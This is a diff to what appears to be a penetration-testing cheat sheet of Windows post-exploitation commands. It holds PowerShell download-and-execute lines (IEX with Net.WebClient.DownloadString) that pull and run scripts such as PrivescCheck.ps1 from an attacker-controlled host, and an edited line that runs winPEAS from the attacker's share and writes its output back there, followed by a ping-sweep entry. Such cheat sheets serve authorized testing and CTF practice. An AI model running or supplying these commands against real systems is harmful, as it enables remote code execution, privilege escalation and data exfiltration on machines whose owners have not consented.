@@ -1705,7 +1705,8 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/whoami')
 
 +---------- Full Privesc Scan ----------+
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/windows/PrivescCheck.ps1');Invoke-PrivescCheck
-//$TARGET/$/winPEASofs.exe
+//$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
+tail -f /Upload/windows/output_winPEAS.txt
 
 +---------- Ping Sweep /24 ----------+
 //$MYIP/$/ping.bat 192.168.210.X
